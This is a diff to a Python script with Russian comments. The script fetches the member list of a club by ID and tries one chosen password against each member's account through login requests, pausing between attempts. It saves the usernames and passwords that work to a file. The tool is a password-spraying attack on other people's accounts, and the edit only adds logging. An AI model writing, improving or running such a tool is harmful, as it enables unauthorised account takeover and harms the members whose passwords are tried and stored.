@@ -1,8 +1,17 @@
 import ndjson
 import requests
 
+import logging
+from rich.logging import RichHandler
+
 from config import *
 
+FORMAT = "%(message)s"
+logging.basicConfig(
+    level=logging.INFO, format=FORMAT, datefmt="[%X]", handlers=[RichHandler()]
+) # настройки для логгинга
+
+log = logging.getLogger("rich") # инциализация лога
 
 def start(password, team):
     print(yellow + "[..] Получаем список, это может занять некоторое время...")
@@ -31,7 +40,7 @@ def start(password, team):
                                    "User-Agent": USER_AGENT}) # пытатаемся войти в акк
 
         if str(r) == f"<Response [{str(OK_RESPONSE)}]>":
-            print(green + f"{get_ts()} {r}, {username}: {password}")
+            log.info(f"Пароль получен! ({r}) {username}: {password}")
             with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
                 h_list.write(f"{get_ts()} {r} {username}: {password} \n")
 
@@ -40,18 +49,20 @@ def start(password, team):
                 mb_list.write(f"{password} \n")
 
         elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
-            print(yellow + f"{get_ts()} {r}, {username}: {password}")
+            log.info(f"{r}, {username}: {password}")
 
             if SAVE_EVERYTHING_CHECK:
                 with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
                     h_list.write(f"{get_ts()} {r} {username}: {password} \n")
 
         elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
-            print(red + f"{get_ts()} {r}, {username}: {password}")
+            log.error(f"{r}, {username}: {password}")
 
             if SAVE_EVERYTHING_CHECK:
                 with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
                     h_list.write(f"{get_ts()} {r} {username}: {password} \n")
+
+
         k += 1
 
         time.sleep(5)
@@ -60,5 +71,5 @@ def start(password, team):
 
 
 if __name__ == "__main__":
-    start(password=input(green + "Введите пароль, которым вы хотите проверить клуб: " + magenta),
-          team=input(yellow + "Введите ID клуба: " + magenta))
+    start(password=input(green + "Введите пароль, которым вы хотите проверить клуб: " + white),
+          team=input(yellow + "Введите ID клуба: " + white))
